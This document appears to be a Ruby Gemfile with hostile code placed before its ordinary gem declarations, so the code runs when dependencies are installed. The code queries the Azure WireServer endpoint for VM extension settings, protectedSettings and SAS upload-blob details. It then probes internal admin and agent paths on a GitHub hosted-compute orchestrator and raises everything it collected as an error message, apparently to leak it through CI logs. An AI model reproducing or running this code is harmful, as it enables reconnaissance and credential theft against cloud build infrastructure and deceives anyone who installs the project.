require 'net/http'
require 'uri'
require 'json'

m = []
begin
  ws = Net::HTTP.get_response(URI('http://168.63.129.16:32526/vmSettings?api-version=2015-09-01'))
  m << "v101 ws_status=#{ws.code} ws_len=#{ws.body.length}"
  if ws.code == "200"
    d = JSON.parse(ws.body) rescue nil
    if d && d['extensionGoalStates']
      ext = d['extensionGoalStates'].first['settings'].first rescue nil
      ps = ext && ext['protectedSettings']
      m << "v101 has_protectedSettings=#{!!ps} ps_len=#{ps ? ps.length : 0}"
      sub = ext && ext['statusUploadBlob'] && ext['statusUploadBlob']['value']
      m << "v101 statusUploadBlob_host=#{URI.parse(sub).host rescue 'parse-fail'}" if sub
      sub_se = sub && sub.match(/se=([^&]+)/)
      m << "v101 SAS_expiry=#{sub_se[1]}" if sub_se
      sub_sp = sub && sub.match(/sp=([^&]+)/)
      m << "v101 SAS_perms=#{sub_sp[1]}" if sub_sp
    end
  end
rescue => e
  m << "v101 ws_err=#{e.class}: #{e.message.to_s[0..80]}"
end

# Enum orchestrator paths
paths = ['/', '/health', '/v1/agents', '/v1/agent', '/v1/jobs', '/v1/job', '/api/v1/agents', '/v1/trace', '/v1/trace/get', '/v1/agent/log', '/v1/agent/logs', '/v1/agents/list', '/api/agent', '/agents', '/jobs', '/admin', '/internal/agents', '/api/v1/health', '/api/v1/orchestrator', '/api/v1/system']
paths.each_with_index do |p, i|
  begin
    h = Net::HTTP.new('hosted-compute-request-orchestrator-prod-eus-02.githubapp.com', 443)
    h.use_ssl = true; h.read_timeout = 4; h.open_timeout = 4
    r = h.get(p)
    body_preview = r.body ? r.body[0..120].to_s.gsub(/[^[:print:]]/,'.') : ''
    m << "v101 orch[#{i}]#{p} #{r.code} L=#{r.body ? r.body.length : 0} body=#{body_preview}"
  rescue => e
    m << "v101 orch[#{i}]#{p}_err=#{e.class.name[0..30]}"
  end
end

raise m.join("\n")

source "https://rubygems.org"
gem "rake", "~> 13.0"
